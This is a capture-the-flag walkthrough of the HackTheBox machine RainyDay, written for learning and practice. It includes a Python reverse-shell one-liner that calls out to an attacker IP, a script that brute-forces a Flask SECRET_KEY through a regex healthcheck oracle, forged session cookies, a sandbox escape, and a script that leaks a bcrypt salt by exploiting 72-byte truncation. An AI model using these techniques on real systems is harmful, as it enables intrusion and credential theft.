---
description: Decent Linux machine with a not so straightforward Python heavy exploit path.
---

# RainyDay

## Gaining Access

As usual, an Nmap scan to find the ports listening on this:

<figure><img src="../../.gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>

When trying to access the HTTP website, the website domain is rainycloud.htb. Add that to the hosts file and move on.

### RainyCloud - Port 80

Viewing the webpage, we can see some sort of docker container application:

<figure><img src="../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

This looks like some sort of Flask application because of the background. Anyways we can look around this website and also gobuster it for directories. We should take note of the user, which is 'jack' and his container name.

Gobuster did not find much, but did find an /api endpoint:

<figure><img src="../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

Enumeration of vhosts also revealed the dev.rainycloud.htb domain.

<figure><img src="../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

Investigating the login function, we can see that on a failed attempt, this appears within the page source.

<figure><img src="../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

Pretty much confirms that this is a Flask application with app.py being used.

### Dev Vhost

There's some form of WAF or ACL on the dev endpoint.

<figure><img src="../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

This looks bypassable using SSRF, but I was unable to make it work.

### API Endpoint

There was a /api endpoint found on the website, and I plan to fuzz that. I used feroxbuster for the recursive abilities.

<figure><img src="../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

This turned out to be a bit fruitless, because I was unable to even find anything of interest. I tried some extensions of my own and found one that works (out of sheer luck).

<figure><img src="../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

Using this method, I was able to make out that there were 3 users, because entering /api/4 would return nothing. So we know that the last parameter should be a number of some sort. I tried out loads of numbers but nothing was returned. It wasn't until I decided to try using 1.0 and it worked...

<figure><img src="../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

&#x20;I was able to get out the remaining hashes, which were for **root and gary.** We can crack these using john. Only one of them was crackable, and it was gary's.

<figure><img src="../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

So his password is rubberducky. With these credentials, we can log in to the website as gary.

### Container Creatio

Within the login, we are able to simply register and start a new docker container.

<figure><img src="../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

Within each docker container, we can basically get RCE on it. This can be done using the execute command button. I found that using the one without the background creates a very unstable shell, so use the other one.

<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

We can use this reverse shell command:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

<figure><img src="../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

### Pivoting

Now, we need to thinkg about how to use this container to find out more about the machine. Firstly, I took a look around at the IP addresses and found out that I should be scanning the other containers present on this network using some tunneling. What gave it away for me was the IP address ending in 3, meaning there are probably other hosts on this.

<figure><img src="../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

As such, I transferred chisel over to this machine and created a tunnel.

<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

Now that we have this, we can begin to enumerate the network inside. We can do a quick ping sweep to see what's alive in there.

Most likely, the first host is 172.18.0.1 (based on other HTB machines), so I started there. I tested if port 22 and 80 were open, similar to the original ports open from our first nmap scan. And they were indeed open.

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

We can then curl this address to see what's going on within it.

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Odd, it refers us back to the original website. Earlier, we found a dev.rainycloud.htb endpoint, which was situated on the original machine. This got me thinking about where this website was hosted, and if 172.18.0.1:80 is open, it could mean that dev.rainycloud.htb is hosted there and we can try to connect to it.

Now, we can try to directly pivot to it.

<figure><img src="../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

We also need to add the correct domain to our hosts file.

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Then we can connect to the dev portal.

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### Dev Portal

We can klook around this thing. Understanding that previously, there was an /api endpoint being used, I decided to look there again.

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Now we can fuzz the /api endpoint more to hopefully find something new. After a long while, I did find a new endpoint at /api/healthcheck.

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Visiting this page gave me this JSON object:

<figure><img src="../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

The last part is the most interesting because it contains some form of regex pattern and its a custom type. This page looks to be appears to be telling us parameters for a POST request perhaps.

Was kinda right in this case, but it appears we are not authenticated.

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

We can try to grab the Cookie from the session earlier on the main website as gary, and it works.

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

So now we know there's an app.py, meaning there's also probably some kind of secret.py because this is a flask application.

<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption><p>\</p></figcaption></figure>

Playing around with this some more, it appears that the 'custom' type would require a pattern, indicating to me this could be searching for regex in files. The reuslt of true / false would tell us whether the character was in it.

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

So now, we would need to create some form of script to brute force out the characters of the SECRET_KEY, because that's needed to decode the cookie and (maybe)_ get a password.

### Brute Force SECRET\_KEY

We can create a really quick python script the brute forcing to get the key.

```python
import string
import requests
import json

chars = string.printable
cookies = {'session': 'eyJ1c2VybmFtZSI6ImdhcnkifQ.Y28liQ.M3OPi3eJ7xcaUmaC0eENYqtHnu4'}

s = requests.Session()
pattern = ""

while True:
    for c in chars:
        try:
            rsp = s.post('http://dev.rainycloud.htb:3333/api/healthcheck', {
                'file': '/var/www/rainycloud/secrets.py',
                'type': 'custom',
                'pattern': "^SECRET_KEY = '" + pattern + c + ".*"
            }, cookies=cookies)
            if json.loads(rsp.content)['result']:
                pattern += c
                print(pattern)
                break
            else:
               pass
               # print(c)
        except Exception:
            print(rsp.content)
```

This would generate the SECRET\_KEY accordingly.

<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

Now, we can actually generate another cookie to login as jack and gain RCE as jack.

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

Replace the cookies and now we can have RCE as jack using the container he created.

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

### Jack's Container

Now that we are on jack's container, we can upload some form of pspy process monitor. Understanding that there's no more need to pivot back to another container, we should view what's going on in this current container.

What we see is this command:

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Weird that the sleep is this long. We can investigate this process in the /proc directory.

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

There's this root directory within the process, and when going into it we are presented with another Linux / directory. This would contain the user flag and also jack's actual home directory.

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Also contains jack's private SSH key.

<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

With this, we can finally SSH into the main machine as jack.

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

When checking sudo privileges, we see this:

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

I wasn't sure what safe\_python was, but it looked to be some kind of binary. I was also unable to check it out and see what it does. Really weird. But it did seem to open files and accept something as a parameter to open.

<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

I think this executes scripts of some kind, because upon creating some fake file, I saw this:

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

There's an exec( ) function being called, which is always interesting. This binary seems to execute python code within a set environment or something. My guess is that we need to create a python script that would execute to get us a shell as jack\_adm.

The next few tests confirms this:

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

There seem to be some keywords being filtered out, most notably 'import' because I cannot run anything that has import within it.&#x20;

### Python Sandbox Escape

As it turns out, this is a form of Python Sandbox Escape challenge, and it's really interesting as it shows us a lot of what's going under the hood with Python.

I found this a good read:

{% embed url="https://stackoverflow.com/questions/73043035/what-is-class-base-subclasses" %}

So there are a bunch of different subclasses, and this binary is executing something using the exec( ) function. There are also likely some filters.&#x20;

I tested a bunch of payloads from here:

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes" %}

However, none from HackTricks really worked. I was wondering which subclass we should use, so I dumped all of them out. Judging from all the import failures I was having, I think we don't have any `__builtins__` to work with here. SO we need to figure out how to load the 'os' module and then execute commands with it.

I found this page particularly useful:

{% embed url="https://hexplo.it/post/escaping-the-csawctf-python-sandbox/" %}

I utilised their method and managed to get the index for this. This was 144.

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Right, so we need to somehow make use of this to import the os library. I could technically import one character each from each of the classes and then spell out 'import os', but that would be...very very long.

Ther ehas to be a way to load the module I want. Eventually, after a few hours of tinkering with this (and by hours I mean like literally 2 days), I got it to work!

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

We can then get RCE as jack\_adm.

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

### Hash\_password.py

After getting to jack\_adm, we can check sudo privileges again to see this:

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Another blind Sudo challenge in Python.  Except, all this does is hash passwords for us into Bcrypt format.

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

This is, without question, similar to the initial hashes we found in the website. My guess is, we need to crack the root hash we found a lot earlier to get get a root shell via SSH.&#x20;

Now that we have this, we would need to somehow find out the salt for this password before cracking it. There are word limits as well, with the length of the password needing to be from 0 to 30.

The first thing that comes to mind here is some form of Hash Extension attack, or an attack on the Bcrypt algorithm somehow.

My guess is that what the script does is, add our input and some secret salt, and then generates the hash to print out.&#x20;

### Bcrypt Exploit

These were good reads:

{% embed url="https://security.stackexchange.com/questions/39849/does-bcrypt-have-a-maximum-password-length" %}

{% embed url="https://www.mscharhag.com/software-development/bcrypt-maximum-password-length" %}

Anyways, what I understand is that Bcrypt has a maximum size of 72 bytes. This program that we are running checks for the length of the input, but not the size. Meaning, we can theoretically inputmore than 72 bytes.

The issue with putting more than 72 bytes is that it would cause the password to be truncated. \
The script should take our input and append it in front of a salt (generally salts come behind) and then encode the whole thing using Bcrypt. It checks for length but not for the size of the input.

I used an online UTF-8 generator to try and find a valid combiantion of characters that would suffice for testing.

{% embed url="https://onlineutf8tools.com/generate-random-utf8" %}

We need a total of 72 bytes, so 23 UTF 3-byte characters + 3 more regular ASCII characters might work. so we can generate out valid hashes as a result of this. In this case, we can start to find the salt that is being used.

Here are 2 instances of using UTF characters in hashing this algorithm with the machine's script.

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Theoretically, because both inputs for these have 72 bytes as UTF-8 characters, if the salt is appended at the back, then these hashes are the same. The input of '123456' in the second attempt is truncated during the hashing algorithm. We can test it here. Notice how the 123456 is not present.

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

So we need to somehow, find out the salt from this thing. We could theoretically generate an input of 71 bytes, and then leave the last character to the salt and repeatedly brute force all the possible characters one by one. So with each character we find, we need to edit our input accordingly to have 1 less byte and to fit the flag there.

I tried making a quick script for this.

```python
#!/usr/bin/python3

import bcrypt
import string
passwd = u'痊茼ﶉ呍ᑫ䞫빜逦ᒶ덋䊼鏁耳䢈筮鰽Ἀᒅaa' #randomly generated
hashed_passwd = u'$2b$05$/vRnmg4ma.8Nkl4FBmWfze.ts9jKrY5tNqqoenp5WN3ZtHxRU8NmC' # taken from sudo as adm user
allchars = string.printable
flag = 'H34vyR41n'
for c in allchars:
	testpasswd = passwd + flag + c
	if bcrypt.checkpw(testpasswd.encode('utf-8'),hashed_passwd.encode('utf-8')):
		print("match at " + c)
```

This would output this:

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

What's interesting is that we are able to sort of drag out one character of the salt, which is H. The first character of this hash seems to not change, indicating that it was a consistent hash. This was really cool, and we are able to slowly pull out the rest of this hash.

I didn't have the prowess (or patience) to code this thing out, so I brute forced it myself using this script.

We are able to drag the next 2 characters out using this method.

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Afterwards, we need to change our input to something that fits and allows me to drag out the next.  We can begin dragging this out and get the final salt. The script does not output it properly afterwards. So 'H34vyR41n' is the salt, and now we can crack the original hash for root we found earlier.

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

We can generate a wordlist with rockyou.txt with the new salt at the back.

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

And we can crack this easily.

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Then we can su to root and grab our flag.

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
